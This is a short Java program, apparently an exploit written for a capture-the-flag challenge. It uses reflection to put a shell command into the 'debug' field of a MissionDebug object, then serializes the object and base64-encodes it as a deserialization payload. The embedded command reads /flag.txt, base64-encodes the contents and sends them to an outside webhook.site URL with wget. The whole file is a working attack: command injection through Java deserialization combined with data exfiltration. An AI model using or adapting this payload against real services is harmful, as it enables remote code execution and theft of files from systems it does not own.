package com.yogosha.utils;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.io.IOException;
import java.lang.reflect.Field;

public class Main {
    public static void main(String[] args) {

        try {
            MissionDebug mission = new MissionDebug();
            Field debugField = mission.getClass().getDeclaredField("debug");
            debugField.setAccessible(true);
            debugField.set(mission, new String(
                    "sh -c $@|sh . echo wget https://webhook.site/4b067d1e-d8b6-45df-90ec-033e0f215c82?a=$(cat /flag.txt|base64|tr -d \"\n\")"));
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(baos);
            oos.writeObject(mission);
            byte[] missionBytes = baos.toByteArray();
            String base64Mission = Base64.getEncoder().encodeToString(missionBytes);
            System.out.println(base64Mission);

        } catch (NoSuchFieldException e) {
            System.out.println(e);
        } catch (IllegalAccessException e) {
            System.out.println(e);
        } catch (IOException e) {
            System.out.println(e);
        }
    }
}